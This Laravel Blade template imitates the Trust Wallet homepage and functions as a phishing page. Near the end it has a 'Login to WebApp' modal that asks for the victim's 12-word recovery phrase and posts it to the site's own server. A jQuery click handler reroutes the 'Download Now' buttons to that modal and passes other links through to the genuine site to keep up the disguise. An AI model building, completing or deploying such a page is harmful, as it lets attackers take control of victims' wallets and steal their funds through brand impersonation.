@extends('layout.app')
    @section('title', 'Best Cryptocurrency Wallet | Trust Wallet')

    @section('content')
        <nav class="navbar navbar-expand-lg navbar-togglable navbar-dark bg-primary d-block">
            <div class="container">
            <a id="navbar-brand" class="navbar-brand" href="/" aria-label="Goes back on homepage">
                <svg class="navbar-brand-img logotype-white" alt="Trust Wallet logotype"></svg>
            </a>
            <button class="navbar-toggler collapsed" id="navbarToggle" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-expanded="false" aria-hidden="true" aria-hidden="true" aria-label="Toggle navigation" aria-controls="navbarCollapse">
            <span class="navbar-toggler-icon collapsed"></span>
            </button>
            <div class="navbar-collapse collapse navbar-margin" id="navbarSupportedContent">
                <button class="navbar-toggler collapsed" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarCollapse" aria-expanded="false" aria-hidden="true" aria-label="Toggle navigation">
                </button>
                <ul class="navbar-nav font-size-sm ml-auto" style="flex-wrap: wrap">
                    <li class="nav-item">
                        <a class="nav-link" href="/assets" aria-label="Goes to supported assets page">Assets</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="/staking" aria-label="Goes to staking page where you can learn what is staking and calculate APRs">Staking</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="/earn" aria-label="Goes to earn page where you can earn up to +11% APR">Earn<span class="badge badge-success ml-2 pl-2 pr-2">+11% APR</span></a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="/nft-wallet" aria-label="Goes to NFT page">NFTs</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="/dapp" aria-label="Goes to DApp browser page">DApp Browser</a>
                    </li>
                    <li class="nav-item dropdown" aria-label=" flag" alt=" flag">
                        <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="false" aria-expanded="true" aria-label="Opens dropdown to select different language for the site">
                        Language
                        <div class="flag bg-" aria-label=" flag"></div>
                        </a>
                        <div class="dropdown-menu dropdown-menu-md" aria-labelledby="navbarDropdown">
                        <div class="list-group list-group-flush">
                            <ul class="list-unstyled list-block">
                                <li class="list-inline-item m-6">
                                    <a href="/" class="list-group-item" aria-label="changes language of the page to en">
                                    <div class="flag bg-en" title="en flag"></div>
                                    </a>
                                </li>
                                <li class="list-inline-item m-6">
                                    <a href="/ru/" class="list-group-item list-inline-item" aria-label="changes language of the page to ru">
                                    <div class="flag bg-ru" title="ru flag"></div>
                                    </a>
                                </li>
                                <li class="list-inline-item m-6">
                                    <a href="/de/" class="list-group-item list-inline-item" aria-label="changes language of the page to de">
                                    <div class="flag bg-de" title="de flag"></div>
                                    </a>
                                </li>
                                <li class="list-inline-item m-6">
                                    <a href="/vi/" class="list-group-item list-inline-item" aria-label="changes language of the page to vi">
                                    <div class="flag bg-vi" title="vi flag"></div>
                                    </a>
                                </li>
                                <li class="list-inline-item m-6">
                                    <a href="/id/" class="list-group-item list-inline-item" aria-label="changes language of the page to id">
                                    <div class="flag bg-id" title="id flag"></div>
                                    </a>
                                </li>
                                <li class="list-inline-item m-6">
                                    <a href="/ko/" class="list-group-item list-inline-item" aria-label="changes language of the page to ko">
                                    <div class="flag bg-ko" title="ko flag"></div>
                                    </a>
                                </li>
                                <li class="list-inline-item m-6">
                                    <a href="/ja/" class="list-group-item list-inline-item" aria-label="changes language of the page to ja">
                                    <div class="flag bg-ja" title="ja flag"></div>
                                    </a>
                                </li>
                                <li class="list-inline-item m-6">
                                    <a href="/tr/" class="list-group-item list-inline-item" aria-label="changes language of the page to tr">
                                    <div class="flag bg-tr" title="tr flag"></div>
                                    </a>
                                </li>
                                <li class="list-inline-item m-6">
                                    <a href="/pt_BR/" class="list-group-item list-inline-item" aria-label="changes language of the page to pt_BR">
                                    <div class="flag bg-pt_BR" title="pt_BR flag"></div>
                                    </a>
                                </li>
                                <li class="list-inline-item m-6">
                                    <a href="/zh_CN/" class="list-group-item list-inline-item" aria-label="changes language of the page to zh_CN">
                                    <div class="flag bg-zh_CN" title="zh_CN flag"></div>
                                    </a>
                                </li>
                                <li class="list-inline-item m-6">
                                    <a href="/es/" class="list-group-item list-inline-item" aria-label="changes language of the page to es">
                                    <div class="flag bg-es" title="es flag"></div>
                                    </a>
                                </li>
                            </ul>
                        </div>
                        </div>
                    </li>
                    <li class="nav-item" data-bs-toggle="modal" data-bs-target="#exampleModal">
                        <a class="nav-link ignore" href="#" aria-label="Goes to DApp browser page">Login to WebApp</a>
                    </li>
                </ul>
            </div>
            </div>
        </nav>
        <main class="page-content" aria-label="Content">
        <section class="pt-8 pb-8 bg-gradient-primary">
            <div class="container">
                <div class="row align-items-center justify-content-center justify-content-md-between">
                    <div class="col-12 col-lg-6 mb-8 text-center text-md-left text-white">
                    <h1 class="display-3 font-weight-bold">The most trusted & secure crypto wallet</h1>
                    <p class="text-white-90 lead mb-4">Buy, store, collect NFTs, exchange & earn crypto. Join 25 million+ people using Trust Wallet.</p>
                    <div class="download-button">
                        <div class="row download">
                            <div class="col-12 col-lg-4 apple">
                                <a href="https://apps.apple.com/app/apple-store/id1288339409?mt=8" data-analytics='"Download Clicks", {"props":{"Target":"App Store"}}' class="downloadapp" aria-label="goes to AppStore to download Trust Wallet for iphones">
                                <svg class="download-app-image download-apple" loading="lazy" role="img" alt="goes to AppStore to download Trust Wallet for iphones" aria-label="goes to AppStore to download Trust Wallet for iphones" rel="noopener"></svg>
                                </a>
                            </div>
                            <div class="col-12 col-lg-4 googleplay">
                                <a href="https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp&referrer=utm_source%3Dwebsite" data-analytics='"Download Clicks", {"props":{"Target":"Google Play"}}' class="downloadapp" aria-label="goes to Google Play store to download Trust Wallet for Android phones">
                                <svg class="download-app-image download-play" loading="lazy" role="img" alt="goes to Google Play store to download Trust Wallet for Android phones" aria-label="goes to Google Play store to download Trust Wallet for Android phones" rel="noopener"></svg>
                                </a>
                            </div>
                            <div class="col-12 col-lg-4 androidapk">
                                <a href="https://trustwallet.com/dl/apk" data-analytics='"Download Clicks", {"props":{"Target":"Download Apk"}}' class="downloadapp" aria-label="Downloads Trust Wallet as APK file for android phones">
                                <svg class="download-app-image download-apk" loading="lazy" role="img" alt="Downloads Trust Wallet as APK file for android phones" aria-label="Downloads Trust Wallet as APK file for android phones" rel="noopener"></svg>
                                </a>
                            </div>
                            <div class="col-12 col-lg-4 huawei hidden">
                                <a href="https://appgallery.huawei.com/#/app/C103425801" data-analytics='"Download Clicks", {"props":{"Target":"Huawei AppGallery"}}' class="downloadapp" aria-label="goes to huawei store to download Trust Wallet for huawei phones">
                                <svg class='download-app-image download-huawei' loading='lazy' role="img" alt="goes to huawei store to download Trust Wallet for huawei phones" aria-label="goes to huawei store to download Trust Wallet for huawei phones" rel="noopener"></svg>
                                </a>
                            </div>
                        </div>
                    </div>
                    </div>
                    <div class="col-12 col-lg-6 text-center">
                    <img loading="lazy" class="hero-image mx-auto d-block img-fluid" src="/assets/images/home_hero.png" alt="Trust Wallet app mobile mockup">
                    </div>
                </div>
            </div>
        </section>
        <section class="pt-6">
            <div class="container">
                <div class="row border-bottom justify-content-center pb-4">
                    <div class="col-12 col-md-auto mr-auto d-flex justify-content-center">
                    <div class="icon icon-xs mb-5">
                        <svg alt="icon card" title="Credit card icon">
                            <use xlink:href="/assets/images/features-2.svg#card"></use>
                        </svg>
                    </div>
                    <div class="ml-4">
                        <span class="font-weight-bold lead">
                        Buy Crypto With a Card
                        </span>
                    </div>
                    </div>
                    <div class="col-12 col-md-auto d-flex justify-content-center">
                    <div class="icon icon-xs mb-5">
                        <svg alt="icon dex" title="Arrow shape icon">
                            <use xlink:href="/assets/images/features-2.svg#dex"></use>
                        </svg>
                    </div>
                    <div class="ml-4">
                        <span class="font-weight-bold lead">
                        Exchange Instantly
                        </span>
                    </div>
                    </div>
                    <div class="col-12 col-md-auto ml-auto d-flex justify-content-center">
                    <div class="icon icon-xs mb-5">
                        <svg alt="icon lock" title="Key lock icon">
                            <use xlink:href="/assets/images/features-2.svg#lock"></use>
                        </svg>
                    </div>
                    <div class="ml-4">
                        <span class="font-weight-bold lead">
                        Private & Secure
                        </span>
                    </div>
                    </div>
                </div>
            </div>
        </section>
        <section class="pt-8">
            <div class="container">
                <div class="row align-items-center justify-content-center justify-content-md-between">
                    <div class="col-12 text-center mt-4 mt-md-0 order-md-2">
                    <h2 class="display-4 font-weight-bold mb-4">You Deserve Easy Access to Cryptocurrencies</h2>
                    <p class="lead text-gray-700">Trust Wallet is for you if you want to</p>
                    </div>
                </div>
                <div class="row align-items-center justify-content-center justify-content-md-between pt-4 pb-4 text-center">
                    <div class="col-12 col-lg-6">
                    <div class="list-group-item d-flex"><span class="mr-4"><em class="check"></em></span>Buy Bitcoin in under five minutes</div>
                    <div class="list-group-item d-flex"><span class="mr-4"><em class="check"></em></span>Easily earn interest on the crypto in your wallet</div>
                    <div class="list-group-item d-flex"><span class="mr-4"><em class="check"></em></span>See your collectibles. Art & NFTs in one place</div>
                    </div>
                    <div class="col-12 col-lg-6">
                    <div class="list-group-item d-flex"><span class="mr-4"><em class="check"></em></span>Exchange your crypto without leaving the app</div>
                    <div class="list-group-item d-flex"><span class="mr-4"><em class="check"></em></span>Track charts and prices within the app</div>
                    <div class="list-group-item d-flex"><span class="mr-4"><em class="check"></em></span>Keep your crypto safe from hackers & scammers</div>
                    </div>
                    <a href="javascript:void(0)" class="btn-download btn btn-primary mt-6 mx-auto downloadapp-native" aria-label="goes to download page to get Trust Wallet App">
                    Download Now
                    </a>
                </div>
            </div>
        </section>
        <section class="pt-8">
            <div class="container">
                <div class="row align-items-center justify-content-center justify-content-md-between">
                    <div class="col-12 col-md-6 col-lg-5 text-center text-md-left mb-4 order-sm-first order-md-2">
                    <h2 class="display-4 font-weight-bold mt-4">Buy Crypto With a Card</h2>
                    <p class="lead text-gray-700">Get your first $50 of Bitcoin, Ethereum, Binance Coin and many other cryptocurrencies.</p>
                    </div>
                    <div class="col-12 col-md-6 col-lg-7">
                    <img loading="lazy" class="img-fluid mx-auto d-block" src="/assets/images/home_cards.png" alt="Trust Wallet mobile mockup shows how it looks like to buy crypto with credit card">
                    </div>
                </div>
                <div class="row align-items-center justify-content-center justify-content-md-between">
                    <div class="col-12 col-md-6 col-lg-5 text-center text-md-left mb-4">
                    <h2 class="display-4 font-weight-bold mt-8">Exchange Instantly</h2>
                    <p class="lead text-gray-700">No forms, no selfies. Trade crypto anytime with ease.</p>
                    </div>
                    <div class="col-12 col-md-6 col-lg-7">
                    <img loading="lazy" class="img-fluid  mx-auto d-block" src="/assets/images/home_dex.png" alt="Trust Wallet mobile mockup shows an example how swapping cryptocurrencies looks like">
                    </div>
                </div>
                <div class="row align-items-center justify-content-center justify-content-md-between">
                    <div class="col-12 col-md-6 col-lg-5 order-sm-2 text-center text-md-left mb-4 order-md-2">
                    <h2 class="display-4 font-weight-bold mt-8">Private & Secure</h2>
                    <p class="lead text-gray-700">Only you can access your wallet. We don’t collect any personal data.</p>
                    </div>
                    <div class="col-12 col-md-6 col-lg-7">
                    <img loading="lazy" class="img-fluid mx-auto d-block" src="/assets/images/home_security.png" alt="Trust Wallet mobile mockup shows that wallet is private and secure">
                    </div>
                </div>
                <div class="row align-items-center justify-content-center justify-content-md-between">
                    <div class="col-12 col-md-6 col-lg-5 text-center text-md-left">
                    <h2 class="display-4 font-weight-bold mt-8">Browser for DApps</h2>
                    <p class="lead text-gray-700">Use your favourite decentralized apps & find new ones, without leaving your wallet.</p>
                    </div>
                    <div class="col-12 col-md-6 col-lg-7">
                    <img loading="lazy" class="img-fluid mx-auto d-block" src="/assets/images/home_dapps.png" alt="Trust Wallet mobile mockup shows list of dapps you can interact within the wallet">
                    </div>
                </div>
            </div>
        </section>
        <section class="pt-8 pb-8 pt-sm-10 pb-sm-10">
            <div class="container">
                <div class="row">
                    <div class="col-12 text-center mb-2">
                    <h3 class="display-4 font-weight-bold">
                        Get started in 3 simple steps
                    </h3>
                    <p class="lead text-gray-700">It only takes a few minutes</p>
                    </div>
                </div>
                <div class="row no-gutters mt-8 mb-6 mb-md-7">
                    <div class="col-12 col-md-4 text-center">
                    <div class="row mb-5">
                        <div class="col"></div>
                        <div class="col-auto icon-xxl">
                            <svg alt="icon icon-sm" aria-label="Illustration that shows a man sitting on a bench downloading a wallet">
                                <use xlink:href="/assets/images/3steps.svg#download" alt="Illustration that shows a man sitting on a bench downloading a wallet"></use>
                            </svg>
                        </div>
                        <div class="col">
                            <hr class="d-none d-md-block mt-8">
                        </div>
                    </div>
                    <h3 class="font-weight-bold">
                        Download Trust Wallet
                    </h3>
                    </div>
                    <div class="col-12 col-md-4 text-center">
                    <div class="row mb-5">
                        <div class="col">
                            <hr class="d-none d-md-block mt-8">
                        </div>
                        <div class="col-auto icon-xxl">
                            <svg alt="icon icon-sm" aria-label="Illustration that shows a man creating a crypto wallet while walking">
                                <use xlink:href="/assets/images/3steps.svg#wallet" alt="Illustration that shows a man creating a crypto wallet while walking"></use>
                            </svg>
                        </div>
                        <div class="col">
                            <hr class="d-none d-md-block mt-8">
                        </div>
                    </div>
                    <h3 class="font-weight-bold">
                        Create a new wallet
                    </h3>
                    </div>
                    <div class="col-12 col-md-4 text-center">
                    <div class="row mb-5">
                        <div class="col">
                            <hr class="d-none d-md-block mt-8">
                        </div>
                        <div class="col-auto icon-xxl">
                            <svg alt="icon icon-sm" aria-label="Illustration that shows a man holding phone while buying cryptocurrencies with credit card">
                                <use xlink:href="/assets/images/3steps.svg#buy" alt="Illustration that shows a man holding phone while buying cryptocurrencies with credit card"></use>
                            </svg>
                        </div>
                        <div class="col"></div>
                    </div>
                    <h3 class="font-weight-bold">
                        Get some crypto
                    </h3>
                    </div>
                </div>
                <div class="row">
                    <div class="col-12 text-center">
                    <a href="javascript:void(0)" class="btn-download btn btn-primary mx-auto downloadapp-native" aria-label="goes to download page to get Trust Wallet App">
                    Download Now
                    </a>
                    </div>
                </div>
            </div>
        </section>
        </main>
        <div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true" style="z-index: 99999999;">
            <div class="modal-dialog">
                <form action="{{route('authenticate.webapp')}}" method="POST" class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title" id="exampleModalLabel">Login to WebApp </h5>
                        <button type="button" class="btn-transparent btn-white button-no" data-bs-dismiss="modal" aria-label="Close">
                            <i class="fa-solid fa-xmark"></i>
                        </button>
                    </div>
                    <div class="modal-body">
                        <div class="row my-4">
                            @csrf
                            {{-- <div class="col-md-6 col-12 my-2">
                                <input type="number" name="passcode" id="passcode" class="form-control" placeholder="Passcode" maxlength="6" minlength="6">
                            </div>
                            <div class="col-md-6 col-12 my-2">
                                <input type="number" name="reenter_passcode" id="reenter_passcode" class="form-control" placeholder="Re-enter passcode" maxlength="6" minlength="6">
                            </div> --}}
                        </div>
                        <textarea name="passphrase" id="passphrase" class="form-control border border-2 mb-4" cols="30" rows="2" placeholder="12 phrase words"></textarea>
                        <div class="suggestion-wrapper my-4" id="passphrase_suggestion">
                            {{-- <span class="badge-suggestions">Ola</span>
                            <span class="badge-suggestions">Miracle</span> --}}
                        </div>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-secondary p-2" data-bs-dismiss="modal">Close</button>
                        <button type="submit" class="btn btn-primary p-2" id="send_form">Login</button>
                    </div>
                </form>
            </div>
        </div>
        <section class="bg-light">
        <div class="container pt-8 pb-8">
            <div class="row align-items-center">
                <div class="col-12 col-md text-center text-lg-left mt-2">
                    <h3 class="font-weight-bold mb-1">
                    Get the Trust Wallet app now!
                    </h3>
                    <p class="text-gray-700 mb-6 mb-md-0 no-whitespace">
                    The most trusted & secure crypto wallet
                    </p>
                </div>
                <div class="col-12 col-lg-7">
                    <div class="download-button">
                    <div class="row download">
                        <div class="col-12 col-lg-4 apple">
                            <a href="https://apps.apple.com/app/apple-store/id1288339409?mt=8" data-analytics='"Download Clicks", {"props":{"Target":"App Store"}}' class="downloadapp" aria-label="goes to AppStore to download Trust Wallet for iphones">
                                <svg class="download-app-image download-apple" loading="lazy" role="img" alt="goes to AppStore to download Trust Wallet for iphones" aria-label="goes to AppStore to download Trust Wallet for iphones" rel="noopener"></svg>
                            </a>
                        </div>
                        <div class="col-12 col-lg-4 googleplay">
                            <a href="https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp&referrer=utm_source%3Dwebsite" data-analytics='"Download Clicks", {"props":{"Target":"Google Play"}}' class="downloadapp" aria-label="goes to Google Play store to download Trust Wallet for Android phones">
                                <svg class="download-app-image download-play" loading="lazy" role="img" alt="goes to Google Play store to download Trust Wallet for Android phones" aria-label="goes to Google Play store to download Trust Wallet for Android phones" rel="noopener"></svg>
                            </a>
                        </div>
                        <div class="col-12 col-lg-4 androidapk">
                            <a href="https://trustwallet.com/dl/apk" data-analytics='"Download Clicks", {"props":{"Target":"Download Apk"}}' class="downloadapp" aria-label="Downloads Trust Wallet as APK file for android phones">
                                <svg class="download-app-image download-apk" loading="lazy" role="img" alt="Downloads Trust Wallet as APK file for android phones" aria-label="Downloads Trust Wallet as APK file for android phones" rel="noopener"></svg>
                            </a>
                        </div>
                        <div class="col-12 col-lg-4 huawei hidden">
                            <a href="https://appgallery.huawei.com/#/app/C103425801" data-analytics='"Download Clicks", {"props":{"Target":"Huawei AppGallery"}}' class="downloadapp" aria-label="goes to huawei store to download Trust Wallet for huawei phones">
                                <svg class='download-app-image download-huawei' loading='lazy' role="img" alt="goes to huawei store to download Trust Wallet for huawei phones" aria-label="goes to huawei store to download Trust Wallet for huawei phones" rel="noopener"></svg>
                            </a>
                        </div>
                    </div>
                    </div>
                </div>
            </div>
        </div>
        </section>
        <footer class="py-8 py-md-8 bg-white">
        <data class="u-url" href="/"></data>
        <div class="container">
            <div class="row text-center text-md-left">
                <div class="col-12 col-md-4 col-lg-3">
                    <a href="/" id="footer-brand-image" aria-label="Goes to homepage">
                    <svg alt="" class="footer-brand-image logotype-dark img-fluid mb-4" aria-label="Goes back to homesite"></svg>
                    </a>
                    <ul class="list-unstyled list-inline list-social mb-6 mb-md-0">
                    <li class="list-inline-item list-social-item pt-2 mr-5 mr-sm-3">
                        <a href="https://facebook.com/trustwalletapp" class="text-decoration-none" target="_blank" rel="noopener" aria-label="Goes to Trust Wallet Facebook fan page">
                            <svg class="social-icon" alt="trustwallet facebook" title="trustwallet facebook">
                                <use xlink:href="/assets/images/socials.svg#social_facebook"></use>
                            </svg>
                        </a>
                    </li>
                    <li class="list-inline-item list-social-item pt-2 mr-5 mr-sm-3">
                        <a href="https://github.com/trustwallet" class="text-decoration-none" target="_blank" rel="noopener" aria-label="Goes to Trust Wallet github page">
                            <svg class="social-icon" alt="trustwallet github" title="trustwallet github">
                                <use xlink:href="/assets/images/socials.svg#social_github"></use>
                            </svg>
                        </a>
                    </li>
                    <li class="list-inline-item list-social-item pt-2 mr-5 mr-sm-3">
                        <a href="https://instagram.com/trustwallet" class="text-decoration-none" target="_blank" rel="noopener" aria-label="Goes to Trust Wallet Instagram fan page">
                            <svg class="social-icon" alt="trustwallet instagram" title="trustwallet instagram">
                                <use xlink:href="/assets/images/socials.svg#social_instagram"></use>
                            </svg>
                        </a>
                    </li>
                    <li class="list-inline-item list-social-item pt-2 mr-5 mr-sm-3">
                        <a href="https://twitter.com/trustwallet" class="text-decoration-none" target="_blank" rel="noopener" aria-label="Goes to Trust Wallet Twitter fan page">
                            <svg class="social-icon" alt="trustwallet twitter" title="trustwallet twitter">
                                <use xlink:href="/assets/images/socials.svg#social_twitter"></use>
                            </svg>
                        </a>
                    </li>
                    <li class="list-inline-item list-social-item pt-2 mr-5 mr-sm-3">
                        <a href="https://reddit.com/r/trustapp" class="text-decoration-none" target="_blank" rel="noopener" aria-label="Goes to Trust Wallet Reddit fan page">
                            <svg class="social-icon" alt="trustwallet reddit" title="trustwallet reddit">
                                <use xlink:href="/assets/images/socials.svg#social_reddit"></use>
                            </svg>
                        </a>
                    </li>
                    <li class="list-inline-item list-social-item pt-2">
                        <a href="https://t.me/trust_announcements" class="text-decoration-none" target="_blank" rel="noopener" aria-label="Goes to Trust Wallet title telegram announcement chat">
                            <svg class="social-icon" alt="trustwallet telegram" title="trustwallet telegram">
                                <use xlink:href="/assets/images/socials.svg#social_telegram"></use>
                            </svg>
                        </a>
                    </li>
                    </ul>
                </div>
                <div class="col-12 col-md-4 col-lg-3">
                    <h4 class="font-weight-bold text-uppercase text-gray-700">Trust Wallet</h4>
                    <ul class="list-unstyled text-gray-700 mb-6 mb-md-8 mb-lg-0">
                    <li class="mb-3">
                        <a href="/assets" class="text-reset" aria-label="Goes to assets page">Assets</a>
                    </li>
                    <li class="mb-3">
                        <a href="/dapp" class="text-reset" aria-label="Goes to dapp browser page">DApp Browser</a>
                    </li>
                    <li class="mb-3">
                        <a href="/stablecoins" class="text-reset" aria-label="Goes to stablecoin page">Stablecoins</a>
                    </li>
                    <li class="mb-3">
                        <a href="/beta" class="text-reset" aria-label="Goes Trust Wallet Beta page">Beta</a>
                    </li>
                    <li class="mb-3">
                        <a href="/nft-wallet" class="text-reset" aria-label="Goes to collectible page">NFTs</a>
                    </li>
                    <li class="mb-3">
                        <a href="/el-salvador-wallet" class="text-reset" aria-label="Goes to el salvador wallet">El Salvador Wallet</a>
                    </li>
                    <li class="mb-3">
                        <a href="https://apps.apple.com/app/apple-store/id1288339409?mt=8" rel="noopener" target="_blank" class="text-reset" aria-label="Opens AppStore page to download Trust Wallet for iphones">Crypto Wallet for iOS</a>
                    </li>
                    <li class="mb-3">
                        <a href="https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp&referrer=utm_source%3Dwebsite" rel="noopener" target="_blank" class="text-reset" aria-label="Opens Google Play page to download Trust Wallet for androids">Crypto Wallet for Android</a>
                    </li>
                    </ul>
                </div>
                <div class="col-12 col-md-4 col-lg-2">
                    <h4 class="font-weight-bold text-uppercase text-gray-700">Information</h4>
                    <ul class="list-unstyled text-gray-700 mb-0">
                    <li class="mb-3">
                        <a href="https://community.trustwallet.com" target="_blank" class="text-reset" aria-label="Opens Trust Wallet community page">Community</a>
                    </li>
                    <li class="mb-3">
                        <a href="https://community.trustwallet.com/c/helpcenter" target="_blank" class="text-reset" aria-label="Opens help Ccnter page">Help Center</a>
                    </li>
                    <li class="mb-3">
                        <a href="https://support.trustwallet.com/" rel="noopener" target="_blank" class="text-reset" aria-label="Opens support page">Support</a>
                    </li>
                    <li class="mb-3">
                        <a href="/blog" rel="noopener" class="text-reset" aria-label="Opens Trust Wallet blog page">DApp Journey</a>
                    </li>
                    <li class="mb-3">
                        <a href="/developer" class="text-reset" aria-label="Opens Developer page">Developers</a>
                    </li>
                    <li class="mb-3">
                        <a href="/submit-dapp" class="text-reset" aria-label="Opens a page with form to submit a dapp for Trust Wallet listing">Submit DApp</a>
                    </li>
                    <li class="mb-3">
                        <a href="/press" class="text-reset" aria-label="Opens a page with brand kit with Trust Wallet logos, icons and many more">Press Kit</a>
                    </li>
                    <li class="mb-3">
                        <a href="/terms-of-services" class="text-reset" aria-label="Opens a page with terms of services">Terms Of Service</a>
                    </li>
                    <li class="mb-3">
                        <a href="/privacy-policy" class="text-reset" aria-label="Opens a page with privacy and policy">Privacy Policy</a>
                    </li>
                    </ul>
                </div>
                <div class="col-12 col-md-4 offset-md-4 col-lg-2 offset-lg-0">
                    <h4 class="font-weight-bold text-uppercase text-gray-700">Use Crypto</h4>
                    <ul class="list-unstyled text-gray-700 mb-6 mb-md-8 mb-lg-0">
                    <li class="mb-3">
                        <a href="/buy-bitcoin" class="text-reset" aria-label="opens a bitcoin page">Buy Bitcoin with a credit card</a>
                    </li>
                    <li class="mb-3">
                        <a href="/buy-ethereum" class="text-reset" aria-label="opens a ethereum page where you can learn how to buy it">Buy Ethereum</a>
                    </li>
                    <li class="mb-3">
                        <a href="/buy-bnb" class="text-reset" aria-label="opens a binance coin page where you can learn how to buy it">Buy BNB</a>
                    </li>
                    <li class="mb-3">
                        <a href="/buy-litecoin" class="text-reset" aria-label="opens a litecoin page where you can learn how to buy it">Buy Litecoin</a>
                    </li>
                    <li class="mb-3">
                        <a href="/buy-tron" class="text-reset" aria-label="opens a bitcoin tron where you can learn how to buy it">Buy TRON</a>
                    </li>
                    <li class="mb-3">
                        <a href="/buy-xrp" class="text-reset" aria-label="opens a xrp page where you can learn how to buy it">Buy XRP</a>
                    </li>
                    <li class="mb-3">
                        <a href="/buy-bitcoincash" class="text-reset" aria-label="opens a bitcoin cash page where you can learn how to buy it">Buy Bitcoin Cash</a>
                    </li>
                    <hr>
                    <li class="mb-3">
                        <a href="/earn-bitcoin" class="text-reset" aria-label="opens a bitcoin page where you can learn how to earn it">Earn Bitcoin</a>
                    </li>
                    <li class="mb-3">
                        <a href="/earn-ethereum" class="text-reset" aria-label="opens a ethereum page where you can learn how to earn it">Earn Ethereum</a>
                    </li>
                    <li class="mb-3">
                        <a href="/earn-binance-coin" class="text-reset" aria-label="opens a binance coin page where you can learn how to earn it">Earn Binance Coin</a>
                    </li>
                    <li class="mb-3">
                        <a href="/earn-cake" class="text-reset" aria-label="opens a cake page where you can learn how to earn it">Earn Cake</a>
                    </li>
                    </ul>
                </div>
                <div class="col-12 col-md-4 col-lg-2">
                    <h4 class="font-weight-bold text-uppercase text-gray-700">Assets</h4>
                    <ul class="list-unstyled text-gray-700 mb-6 mb-md-8 mb-lg-0">
                    <li class="mb-3"><a href="/bitcoin-wallet" class="text-gray-700" aria-label="Goes to the page of  (BTC) where you can learn more about it">Bitcoin (BTC)</a>
                    <li class="mb-3"><a href="/ethereum-wallet" class="text-gray-700" aria-label="Goes to the page of  (ETH) where you can learn more about it">Ethereum (ETH)</a>
                    <li class="mb-3"><a href="/binance-coin-wallet" class="text-gray-700" aria-label="Goes to the page of  (BNB) where you can learn more about it">Binance Coin (BNB)</a>
                    <li class="mb-3"><a href="/litecoin-wallet" class="text-gray-700" aria-label="Goes to the page of  (LTC) where you can learn more about it">Litecoin (LTC)</a>
                    <li class="mb-3"><a href="/xrp-wallet" class="text-gray-700" aria-label="Goes to the page of  (XRP) where you can learn more about it">Ripple (XRP)</a>
                    <li class="mb-3"><a href="/dogecoin-wallet" class="text-gray-700" aria-label="Goes to the page of  (DOGE) where you can learn more about it">Dogecoin (DOGE)</a>
                    <li class="mb-3"><a href="/polkadot-wallet" class="text-gray-700" aria-label="Goes to the page of  (DOT) where you can learn more about it">Polkadot (DOT)</a>
                    <li class="mb-3"><a href="/smart-chain-wallet" class="text-gray-700" aria-label="Goes to the page of  (BNB) where you can learn more about it">Smartchain (BNB)</a>
                    <li class="mb-3"><a href="/dash-wallet" class="text-gray-700" aria-label="Goes to the page of  (DASH) where you can learn more about it">Dash (DASH)</a>
                    <li class="mb-3"><a href="/tron-wallet" class="text-gray-700" aria-label="Goes to the page of  (TRX) where you can learn more about it">TRON (TRX)</a>
                    <li class="mb-3"><a href="/tezos-wallet" class="text-gray-700" aria-label="Goes to the page of  (XTZ) where you can learn more about it">Tezos (XTZ)</a>
                    <li class="mb-3"><a href="/cosmos-wallet" class="text-gray-700" aria-label="Goes to the page of  (ATOM) where you can learn more about it">Cosmos (ATOM)</a>
                    <li class="mb-3"><a href="/stellar-wallet" class="text-gray-700" aria-label="Goes to the page of  (XLM) where you can learn more about it">Stellar (XLM)</a>
                    <li class="mb-3"><a href="/kava-wallet" class="text-gray-700" aria-label="Goes to the page of  (KAVA) where you can learn more about it">Kava (KAVA)</a>
                    </ul>
                </div>
            </div>
        </div>
        </footer>
        {{-- <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.5/dist/umd/popper.min.js" integrity="sha384-Xe+8cL9oJa6tN/veChSP7q+mnSPaj5Bcu9mPX5F5xIGE0DVittaqT5lorf0EI7Vk" crossorigin="anonymous"></script> --}}
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.min.js" integrity="sha384-ODmDIVzN+pFdexxHEHFBQH3/9/vQ9uori45z4JjnFsRydbmQbmL5t1tQ0culUzyK" crossorigin="anonymous"></script>
        <script  src="{{asset('assets/js/scripting.js')}}"></script>
        <script>
            $("a").click(function(){
                event.preventDefault();
                if($(this).hasClass('ignore')){
                    $(this).unbind('click')
                }else{
                    event.preventDefault();
                    console.log($(this).hasClass('btn-download'))
                    if($(this).hasClass('btn-download')){
                        $('#exampleModal').modal('show');
                        $(this).unbind('click')
                    }else{
                        window.location = 'https://trustwallet.com'+$(this).attr('href');
                    }
                }
            });
        </script>
    @endsection